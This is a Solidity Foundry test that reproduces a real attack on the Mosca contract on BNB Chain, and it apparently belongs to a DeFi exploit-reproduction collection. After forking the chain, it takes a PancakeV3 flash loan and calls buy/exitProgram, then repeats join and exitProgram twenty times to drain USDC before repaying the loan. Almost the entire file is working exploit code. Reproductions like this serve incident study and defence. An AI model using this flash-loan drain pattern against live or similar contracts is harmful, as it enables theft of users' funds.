// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 19K
// Attacker : https://bscscan.com/address/0xb7d7240c207e094a9be802c0f370528a9c39fed5
// Attack Contract : https://bscscan.com/address/0x851288dcfb39330291015c82a5a93721cc92507a
// Vulnerable Contract : https://bscscan.com/address/0x1962b3356122d6a56f978e112d14f5e23a25037d
// Attack Tx : https://bscscan.com/tx/0x4e5bb7e3f552f5ee6ee97db9a9fcf07287aae9a1974e24999690855741121aff

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x1962b3356122d6a56f978e112d14f5e23a25037d#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

import "../interface.sol";

interface IMosca {
    function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external;
    function buy(uint256 amount, bool buyFiat, uint8 fiat) external;
    function exitProgram() external;
}


contract Mosca is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 45_519_929;

    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant MOSCA = 0x1962b3356122d6A56f978e112d14f5E23a25037D;
    address internal constant PancakePool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;


    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        deal(USDC, address(this), 30_000_000_000_000_000_000);
        fundingToken = address(USDC);
    }

    function testExploit() public balanceLog {
        IERC20(USDC).approve(MOSCA, type(uint256).max);

        uint256 amount = 30_000_000_000_000_000_000;
        uint256 refCode = 0;
        uint8 fiat = 2;
        bool enterpriseJoin = false;
        IMosca(MOSCA).join(amount, refCode, fiat, enterpriseJoin);

        address recipient = address(this);
        uint256 amount0 = 0;
        uint256 amount1 = 1_000_000_000_000_000_000_000;
        bytes memory data = abi.encode(amount1);
        IPancakeV3Pool(PancakePool).flash(recipient, amount0, amount1, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        (uint256 amount) = abi.decode(data, (uint256));
        IMosca(MOSCA).buy(amount, true, 2);
        IMosca(MOSCA).exitProgram();
        
        uint256 joinAmount = 30_000_000_000_000_000_000;
        
        for(uint256 i=0;i<20;i++) {
            IMosca(MOSCA).join(joinAmount, 0, 2, false);
            IMosca(MOSCA).exitProgram();
        }

        IERC20(USDC).transfer(msg.sender, amount+fee1);
    }
}
